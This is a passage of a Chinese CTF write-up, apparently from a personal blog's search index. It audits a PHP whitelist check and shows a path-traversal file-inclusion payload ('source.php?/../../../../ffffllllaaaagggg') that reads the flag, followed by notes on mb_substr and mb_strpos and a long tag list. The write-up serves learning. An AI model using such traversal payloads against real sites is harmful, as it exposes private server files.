isset($page) || !is_string($page)) &#123; echo &quot;you can&#x27;t see it&quot;; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#x27;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; ?&gt; 发现include（）应该是文件包含同时还发现白名单不妨访问一下hint.php很明显我们需要包含文件ffffllllaaaagggg这一文件 审计php源代码可知只要file这个文件在它的？号前面的符合白名单即可从而构造出payload 1?file=source.php?/../../../../ffffllllaaaagggg 即可得到flag这里用到了../../../..这种目录穿越从而利用目录遍历的手法 学到的东西php的函数 参考菜鸟教程mb_substr() 函数返回字符串的一部分四个参数str 必需。从该 string 中提取子字符串。start 必需。规定在字符串的何处开始。正数 - 在字符串的指定位置开始负数 - 在从字符串结尾的指定位置开始0 - 在字符串中的第一个字符处开始length 可选。规定要返回的字符串长度。默认是直到字符串的结尾。正数 - 从 start 参数所在的位置返回负数 - 从字符串末端返回encoding 可选。字符编码。如果省略，则使用内部字符编码。 mb_strpos（）反回字符或字符串在另一字符串的所在位置int mb_strpos ( string $haystack , string $needle [, int $offset = 0 [, string $encoding = mb_internal_encoding() ]] )四个参数haystackThe string being checked.要被检查的 string。needleThe string to find in haystack. In contrast with strpos(), numeric values are not applied as the ordinal value of a character.在 haystack 中查找这个字符串。 和 strpos() 不同的是，数字的值不会被当做字符的顺序值。offset（可选）The search offset. If it is not specified, 0 is used. A negative offset counts from the end of the string.搜索位置的偏移。如果没有提供该参数，将会使用 0。负数的 offset 会从字符串尾部开始统计。encoding（可选）The encoding parameter is the character encoding. If it is omitted, the internal character encoding value will be used.encoding 参数为字符编码。如果省略，则使用内部字符编码。Return ValuesReturns the numeric position of the first occurrence of needle in the haystack string. If needle is not found, it returns FALSE.返回 string 的 haystack 中 needle 首次出现位置的数值。 如果没有找到 needle，它将返回 FALSE。","categories":[{"name":"ctf-Write up","slug":"ctf-Write-up","permalink":"http://m0th.top/categories/ctf-Write-up/"}],"tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"http://m0th.top/tags/ctf-web/"},{"name":"文件包含","slug":"文件包含","permalink":"http://m0th.top/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"反序列化","slug":"反序列化","permalink":"http://m0th.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]}],"categories":[{"name":"java学习之路","slug":"java学习之路","permalink":"http://m0th.top/categories/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/"},{"name":"ctf-Write up","slug":"ctf-Write-up","permalink":"http://m0th.top/categories/ctf-Write-up/"},{"name":"用python解决算法谜题","slug":"用python解决算法谜题","permalink":"http://m0th.top/categories/%E7%94%A8python%E8%A7%A3%E5%86%B3%E7%AE%97%E6%B3%95%E8%B0%9C%E9%A2%98/"},{"name":"web漏洞笔记","slug":"web漏洞笔记","permalink":"http://m0th.top/categories/web%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"},{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://m0th.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"linux运维","slug":"linux运维","permalink":"http://m0th.top/categories/linux%E8%BF%90%E7%BB%B4/"},{"name":"计算机基础","slug":"计算机基础","permalink":"http://m0th.top/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"},{"name":"渗透测试学习笔记","slug":"渗透测试学习笔记","permalink":"http://m0th.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"环境搭建","slug":"环境搭建","permalink":"http://m0th.top/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"name":"ctf-tools","slug":"ctf-tools","permalink":"http://m0th.top/categories/ctf-tools/"}],"tags":[{"name":"java","slug":"java","permalink":"http://m0th.top/tags/java/"},{"name":"双文件上传","slug":"双文件上传","permalink":"http://m0th.top/tags/%E5%8F%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"源码泄露","slug":"源码泄露","permalink":"http://m0th.top/tags/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"},{"name":"php漏洞","slug":"php漏洞","permalink":"http://m0th.top/tags/php%E6%BC%8F%E6%B4%9E/"},{"name":"bypass","slug":"bypass","permalink":"http://m0th.top/tags/bypass/"},{"name":"堆叠注入","slug":"堆叠注入","permalink":"http://m0th.top/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"},{"name":"反序列化","slug":"反序列化","permalink":"http://m0th.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"sql注入","slug":"sql注入","permalink":"http://m0th.top/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"ssrf","slug":"ssrf","permalink":"http://m0th.top/tags/ssrf/"},{"name":"bool盲注","slug":"bool盲注","permalink":"http://m0th.top/tags/bool%E7%9B%B2%E6%B3%A8/"},{"name":"文件上传","slug":"文件上传","permalink":"http://m0th.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"命令执行绕过","slug":"命令执行绕过","permalink":"http://m0th.top/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/"},{"name":"misc","slug":"misc","permalink":"http://m0th.top/tags/misc/"},{"name":"php伪协议","slug":"php伪协议","permalink":"http://m0th.top/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"},{"name":"unicode欺骗","slug":"unicode欺骗","permalink":"http://m0th.top/tags/unicode%E6%AC%BA%E9%AA%97/"},{"name":"session伪造","slug":"session伪造","permalink":"http://m0th.top/tags/session%E4%BC%AA%E9%80%A0/"},{"name":"ctf-web","slug":"ctf-web","permalink":"http://m0th.top/tags/ctf-web/"},{"name":"算法入门","slug":"算法入门","permalink":"http://m0th.top/tags/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8/"},{"name":"http走私攻击","slug":"http走私攻击","permalink":"http://m0th.top/tags/http%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB/"},{"name":"php字符串解析漏洞","slug":"php字符串解析漏洞","permalink":"http://m0th.top/tags/php%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"},{"name":"暴破","slug":"暴破","permalink":"http://m0th.top/tags/%E6%9A%B4%E7%A0%B4/"},{"name":"字典制作","slug":"字典制作","permalink":"http://m0th.top/tags/%E5%AD%97%E5%85%B8%E5%88%B6%E4%BD%9C/"},{"name":"命令执行","slug":"命令执行","permalink":"http://m0th.top/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"XXE","slug":"XXE","permalink":"http://m0th.top/tags/XXE/"},{"name":"文件包含","slug":"文件包含","permalink":"http://m0th.top/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"CSRF","slug":"CSRF","permalink":"http://m0th.top/tags/CSRF/"},{"name":"XSS","slug":"XSS","permalink":"http://m0th.top/tags/XSS/"},{"name":"docker","slug":"docker","permalink":"http://m0th.top/tags/docker/"},{"name":"sql注入派生表利用","slug":"sql注入派生表利用","permalink":"http://m0th.top/tags/sql%E6%B3%A8%E5%85%A5%E6%B4%BE%E7%94%9F%E8%A1%A8%E5%88%A9%E7%94%A8/"},{"name":"nginx","slug":"nginx","permalink":"http://m0th.top/tags/nginx/"},{"name":"ciscn","slug":"ciscn","permalink":"http://m0th.top/tags/ciscn/"},{"name":"计算机网络","slug":"计算机网络","permalink":"http://m0th.top/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"name":"信息收集","slug":"信息收集","permalink":"http://m0th.top/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"md5强碰撞","slug":"md5强碰撞","permalink":"http://m0th.top/tags/md5%E5%BC%BA%E7%A2%B0%E6%92%9E/"},{"name":"RCE","slug":"RCE","permalink":"http://m0th.top/tags/RCE/"},{"name":"hexo","slug":"hexo","permalink":"http://m0th.top/tags/hexo/"},{"name":"签到题","slug":"签到题","permalink":"http://m0th.top/tags/%E7%AD%BE%E5%88%B0%E9%A2%98/"},{"name":"md5弱相等","slug":"md5弱相等","permalink":"http://m0th.top/tags/md5%E5%BC%B1%E7%9B%B8%E7%AD%89/"},{"name":"web","slug":"web","permalink":"http://m0th.top/tags/web/"},{"name":"电脑常识","slug":"电脑常识","permalink":"http://m0th.top/tags/%E7%94%B5%E8%84%91%E5%B8%B8%E8%AF%86/"},{"name":"web安全","slug":"web安全","permalink":"http://m0th.top/tags/web%E5%AE%89%E5%85%A8/"}]}